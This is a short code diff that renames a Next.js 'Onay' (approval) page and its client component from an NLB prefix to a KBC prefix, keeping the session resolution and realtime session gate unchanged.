@@ -1,12 +1,12 @@
 import { SessionRealtimeGate } from "@/components/demo/SessionRealtimeGate";
 import { resolveServerSessionIdentity } from "@/lib/session-id";
-import { NlbOnayClient } from "./nlb-onay-client";
+import { KbcOnayClient } from "./kbc-onay-client";
 
 type Props = {
   searchParams: Promise<{ session?: string }>;
 };
 
-export default async function NlbOnayPage({ searchParams }: Props) {
+export default async function KbcOnayPage({ searchParams }: Props) {
   const { sessionId, routeSessionId } = await resolveServerSessionIdentity({
     searchParams: await searchParams,
   });
@@ -14,7 +14,7 @@ export default async function NlbOnayPage({ searchParams }: Props) {
   return (
     <>
       <SessionRealtimeGate sessionId={sessionId ?? ""} routeSessionId={routeSessionId ?? undefined} />
-      <NlbOnayClient sessionId={sessionId} />
+      <KbcOnayClient sessionId={sessionId} />
     </>
   );
 }
